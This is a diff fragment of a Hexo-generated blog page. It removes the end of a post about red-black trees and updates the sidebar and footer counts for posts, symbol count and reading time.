-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523602992-1667461359787.png" class width="1655523602992"> 
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2515,7 +2592,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">272</span>
+          <span class="site-state-item-count">273</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2564,12 +2641,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">3.7m</span>
+    <span title="Symbols count total">3.8m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">56:01</span>
+    <span title="Reading time total">56:52</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
